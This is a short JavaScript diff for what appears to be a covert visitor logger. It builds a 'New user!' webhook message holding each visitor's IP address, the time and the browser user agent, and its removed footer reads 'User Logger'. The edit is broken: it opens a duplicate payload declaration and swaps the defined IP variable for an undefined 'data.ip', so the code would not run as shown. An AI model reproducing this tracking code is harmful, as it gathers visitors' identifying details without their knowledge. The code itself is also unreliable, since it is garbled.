@@ -18,6 +18,7 @@
                 const userIP = ipData.ip;
 
                 const payload = {
+    const payload = {
     embeds: [
         {
             title: "New user!",
@@ -25,24 +26,18 @@
             fields: [
                 {
                     name: "IP",
-                    value: userIP,
-                    inline: false
+                    value: `${data.ip}`,
                 },
                 {
                     name: "Data",
-                    value: new Date().toLocaleString(),
-                    inline: false
+                    value: `${new Date().toLocaleString()}`,
                 },
                 {
                     name: "WebBrowser",
-                    value: navigator.userAgent,
-                    inline: false
+                    value: `${navigator.userAgent}`,
                 }
             ],
-            footer: {
-                text: "User Logger"
-            },
-            timestamp: new Date().toISOString()
+            timestamp: new Date().toISOString(),
         }
     ]
 };
